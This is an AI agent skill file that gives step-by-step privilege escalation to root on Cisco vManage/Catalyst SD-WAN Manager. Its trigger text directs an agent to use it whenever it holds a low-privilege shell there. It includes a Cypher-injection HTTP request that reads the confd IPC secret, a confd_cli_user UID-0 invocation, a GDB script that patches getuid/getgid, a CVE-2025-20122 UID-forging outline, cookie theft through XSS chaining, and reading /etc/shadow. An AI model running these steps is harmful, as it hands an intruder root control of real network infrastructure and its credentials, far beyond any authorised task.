---
name: cisco-vmanage-privilege-escalation
description: Privilege escalation techniques for Cisco vManage/Catalyst SD-WAN Manager. Use this skill whenever you have a low-privilege shell on a Cisco vManage system and need to escalate to root. Trigger this when you see vManage, Catalyst SD-WAN, confd, cmdptywrapper, or when you have a vmanage/neteng user shell and need root access. Also use when analyzing Cisco SD-WAN vulnerabilities or reviewing CVE-2025-20122, CVE-2024-20475, or Neo4j deserialization attacks on vManage.
---

# Cisco vManage Privilege Escalation

This skill provides multiple paths to escalate from a low-privilege user (typically `vmanage` or `neteng`) to root on Cisco vManage/Catalyst SD-WAN Manager systems.

## When to Use This Skill

- You have a shell as `vmanage`, `neteng`, or similar low-priv user on vManage
- You've exploited a vulnerability (Neo4j deserialization, XSS, etc.) and need to escalate
- You're analyzing Cisco SD-WAN security or testing vManage hardening
- You see `confd`, `cmdptywrapper`, or vManage-specific processes in `ps aux`

## Prerequisites

- Low-privilege shell access to the vManage system
- Network connectivity to internal services (for Path 1)
- GDB available on the system (for Path 2)
- Knowledge of the system's process layout

---

## Path 1: Neo4j Deserialization + IPC Secret

**Best when:** You have a Neo4j deserialization RCE or can read `/etc/confd/confd_ipc_secret`

### Step 1: Extract the IPC Secret

The `confd` service uses a secret file for IPC authentication:

```bash
# Check if you can read the secret directly
ls -al /etc/confd/confd_ipc_secret

# If you have Neo4j deserialization access, extract via HTTP:
# GET /dataservice/group/devices?groupId=test\'<>"test\\")+RETURN+n+UNION+LOAD+CSV+FROM+"file:///etc/confd/confd_ipc_secret"+AS+n+RETURN+n+//+' HTTP/1.1
# Host: vmanage-XXXXXX.viptela.net
```

### Step 2: Use confd_cli_user

```bash
# Save the secret to a temp file
echo -n "<SECRET_FROM_ABOVE>" > /tmp/ipc_secret

# Set the environment variable
export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

# If confd_cli_user is readable, use it directly:
/usr/bin/confd_cli_user -U 0 -G 0

# If not readable, copy it from rootfs first, then run
```

### Step 3: Get Root Shell

```bash
# After running confd_cli_user with -U 0 -G 0:
# You'll see: "admin connected from 127.0.0.1 using console on vManage"

# Enter vshell to get a root shell:
vshell

# Verify root:
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## Path 2: GDB UID/GID Patching

**Best when:** You have GDB available and can't read `confd_cli_user`

### Step 1: Create the GDB Script

Use the bundled script `scripts/root.gdb` or create it manually:

```gdb
# root.gdb
set environment USER=root

define root
   finish
   set $rax=0
   continue
end

break getuid
commands
   root
end

break getgid
commands
   root
end

run
```

### Step 2: Run confd_cli with GDB

```bash
gdb -x /path/to/root.gdb /usr/bin/confd_cli
```

### Step 3: Get Root Shell

```bash
# After GDB patches the calls, you'll see:
# "root connected from 127.0.0.1 using console on vmanage"

vshell
whoami
# root
```

---

## Path 3: CVE-2025-20122 CLI Input Validation Bug

**Best when:** You have any low-priv shell and the system is vulnerable to CVE-2025-20122

### Overview

This vulnerability allows any authenticated local user to forge UID/GID fields in CLI requests, bypassing validation and spawning a root-backed PTY.

### Step 1: Locate the CLI IPC Endpoint

```bash
# Find the cmdptywrapper listener
ps aux | grep cmdptywrapper
# Look for: -I 127.0.0.1 -p 4565

# Or check listening ports:
netstat -tlnp | grep 4565
```

### Step 2: Craft the Forged Request

The validation bug fails to enforce the original caller's UID. Send a request that forges UID/GID to 0:

```bash
# Connect to the CLI service and send forged UID/GID
# The exact format depends on the protocol, but the key is:
# - Set UID field to 0
# - Set GID field to 0
# - Pipe commands through: vshell; id
```

### Step 3: Execute Commands as Root

```bash
# Once connected with forged credentials:
vshell
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## Chaining with Other Vulnerabilities

### CVE-2024-20475: Authenticated UI XSS

If you can inject JavaScript in the vManage UI:

1. Steal an admin session cookie
2. Use the session to access `vshell` via the browser
3. Get a local shell
4. Use Path 3 above to escalate to root

---

## Verification Checklist

After escalation, verify you have root:

```bash
# Check UID
id

# Check effective permissions
whoami

# Try writing to root-owned files
touch /root/test_file

# Check for sensitive files
cat /etc/shadow
```

---

## Troubleshooting

### "Permission denied" on confd_cli_user
- The binary is root-owned. Use Path 2 (GDB) instead.

### GDB not available
- Try Path 1 if you can extract the IPC secret.
- Check if `gdb` exists: `which gdb`

### cmdptywrapper not listening on 4565
- Check the actual port: `ps aux | grep cmdptywrapper | grep -oP '\-p \K[0-9]+'
- The port may vary by version.

### Neo4j deserialization not working
- Ensure the Neo4j instance is running under `vmanage` user.
- Check the exact endpoint path for your vManage version.

---

## References

- [Synacktiv: Pentesting Cisco SD-WAN Part 1](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [Walmart Global Tech: Hacking Cisco SD-WAN vManage](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [CVE-2025-20122: Cisco Catalyst SD-WAN Manager Privilege Escalation](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
- [CVE-2024-20475: Cisco Catalyst SD-WAN Manager XSS](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)
